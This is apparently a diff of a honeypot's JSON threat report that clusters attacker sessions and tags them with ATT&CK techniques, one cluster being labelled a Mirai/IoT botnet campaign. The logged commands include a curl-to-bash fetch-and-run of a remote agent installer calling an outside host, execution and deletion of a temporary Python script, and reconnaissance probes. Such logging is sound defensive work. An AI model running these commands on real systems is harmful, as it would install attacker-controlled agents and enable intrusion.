@@ -1,11 +1,24 @@
 {
-  "generated_at": "2026-06-08T06:21:38.043235+00:00",
-  "total_sessions_with_commands": 1,
-  "total_clusters": 1,
-  "campaign_clusters": 0,
-  "singleton_clusters": 1,
-  "highest_severity": "NONE",
-  "active_campaigns": [],
+  "generated_at": "2026-06-08T08:13:16.167816+00:00",
+  "total_sessions_with_commands": 13,
+  "total_clusters": 6,
+  "campaign_clusters": 1,
+  "singleton_clusters": 3,
+  "highest_severity": "HIGH",
+  "active_campaigns": [
+    {
+      "cluster_id": "CLU-002",
+      "name": "Mirai/IoT Botnet",
+      "severity": "HIGH",
+      "session_count": 2,
+      "unique_ip_count": 2,
+      "ttps": [
+        "T1082",
+        "T1105",
+        "T1059.004"
+      ]
+    }
+  ],
   "clusters": [
     {
       "cluster_id": "CLU-001",
@@ -14,9 +27,221 @@
       "campaign_severity": null,
       "campaign_description": null,
       "matched_campaigns": [],
+      "session_count": 6,
+      "unique_ips": [
+        "161.118.237.181",
+        "155.248.205.117",
+        "161.118.136.222"
+      ],
+      "unique_ip_count": 3,
+      "sequence_hash": "d2af147dd3fa2817",
+      "ttps": [
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        }
+      ],
+      "representative_commands": [
+        "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
+        "apt-get update -y",
+        "apt-get install -y python3",
+        "python3 /tmp/bendi.py",
+        "rm /tmp/bendi.py",
+        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
+        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sexy.pp.ua --auto-discovery DsR94pYWmSUpC3n43RmwPxKw"
+      ],
+      "members": [
+        {
+          "session_id": "IR-bd0c73d8b9f6",
+          "src_ip": "161.118.136.222",
+          "country": "",
+          "isp": "",
+          "command_count": 7,
+          "timestamp": "2026-06-08T06:32:30.573442Z"
+        },
+        {
+          "session_id": "IR-a0ba2dc7b7c4",
+          "src_ip": "161.118.136.222",
+          "country": "",
+          "isp": "",
+          "command_count": 7,
+          "timestamp": "2026-06-08T06:35:00.181235Z"
+        },
+        {
+          "session_id": "IR-d97335f6d260",
+          "src_ip": "155.248.205.117",
+          "country": "",
+          "isp": "",
+          "command_count": 7,
+          "timestamp": "2026-06-08T07:06:42.315472Z"
+        },
+        {
+          "session_id": "IR-38482ab38319",
+          "src_ip": "155.248.205.117",
+          "country": "",
+          "isp": "",
+          "command_count": 7,
+          "timestamp": "2026-06-08T07:09:07.546863Z"
+        },
+        {
+          "session_id": "IR-446144e83849",
+          "src_ip": "161.118.237.181",
+          "country": "",
+          "isp": "",
+          "command_count": 7,
+          "timestamp": "2026-06-08T07:24:52.531740Z"
+        },
+        {
+          "session_id": "IR-12d89b426cd0",
+          "src_ip": "161.118.237.181",
+          "country": "",
+          "isp": "",
+          "command_count": 7,
+          "timestamp": "2026-06-08T07:27:18.454004Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-002",
+      "is_campaign": true,
+      "campaign_name": "Mirai/IoT Botnet",
+      "campaign_severity": "HIGH",
+      "campaign_description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
+      "matched_campaigns": [
+        {
+          "name": "Mirai/IoT Botnet",
+          "ttps": [
+            "T1105",
+            "T1059.004"
+          ],
+          "severity": "HIGH",
+          "description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
+          "pattern_hits": 2,
+          "pattern_total": 3
+        }
+      ],
+      "session_count": 2,
+      "unique_ips": [
+        "176.65.139.151",
+        "64.89.162.139"
+      ],
+      "unique_ip_count": 2,
+      "sequence_hash": "247e5eacc7fee14d",
+      "ttps": [
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        },
+        {
+          "id": "T1105",
+          "name": "T1105"
+        },
+        {
+          "id": "T1059.004",
+          "name": "T1059.004"
+        }
+      ],
+      "representative_commands": [
+        "echo SHELL_TEST",
+        "/bin/busybox TEST",
+        "cat /proc",
+        "./"
+      ],
+      "members": [
+        {
+          "session_id": "IR-f1e3121819ff",
+          "src_ip": "176.65.139.151",
+          "country": "",
+          "isp": "",
+          "command_count": 4,
+          "timestamp": "2026-06-08T07:17:12.149813Z"
+        },
+        {
+          "session_id": "IR-9100fe64a0b8",
+          "src_ip": "64.89.162.139",
+          "country": "",
+          "isp": "",
+          "command_count": 4,
+          "timestamp": "2026-06-08T07:22:35.210511Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-003",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "223.228.43.34"
+        "65.49.20.69"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "0f316faef8284367",
+      "ttps": [],
+      "representative_commands": [
+        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 OPR/120.0.0.0",
+        "Accept: */*",
+        "Accept-Encoding: gzip"
+      ],
+      "members": [
+        {
+          "session_id": "IR-07e584713b5b",
+          "src_ip": "65.49.20.69",
+          "country": "",
+          "isp": "",
+          "command_count": 3,
+          "timestamp": "2026-06-08T07:14:22.058690Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-004",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 2,
+      "unique_ips": [
+        "130.61.23.223"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "d4c1272038d13611",
+      "ttps": [],
+      "representative_commands": [
+        "User-Agent: Go-http-client/1.1"
+      ],
+      "members": [
+        {
+          "session_id": "IR-7446a35c82a2",
+          "src_ip": "130.61.23.223",
+          "country": "",
+          "isp": "",
+          "command_count": 1,
+          "timestamp": "2026-06-08T06:25:15.173453Z"
+        },
+        {
+          "session_id": "IR-563e301fa153",
+          "src_ip": "130.61.23.223",
+          "country": "",
+          "isp": "",
+          "command_count": 1,
+          "timestamp": "2026-06-08T06:25:15.847065Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-005",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "10.0.0.73"
       ],
       "unique_ip_count": 1,
       "sequence_hash": "e596899f114b5162",
@@ -26,12 +251,45 @@
       ],
       "members": [
         {
-          "session_id": "IR-76813f01aabd",
-          "src_ip": "223.228.43.34",
+          "session_id": "IR-3d1bd8de0a51",
+          "src_ip": "10.0.0.73",
           "country": "",
           "isp": "",
           "command_count": 1,
-          "timestamp": "2026-06-08T06:02:18.369609Z"
+          "timestamp": "2026-06-08T07:38:07.872462Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-006",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "2.57.122.238"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "876deb10d4cf5b5c",
+      "ttps": [
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        }
+      ],
+      "representative_commands": [
+        "/bin/./uname -s -v -n -r -m"
+      ],
+      "members": [
+        {
+          "session_id": "IR-d1a7bbab7c4a",
+          "src_ip": "2.57.122.238",
+          "country": "",
+          "isp": "",
+          "command_count": 1,
+          "timestamp": "2026-06-08T08:02:39.052160Z"
         }
       ]
     }
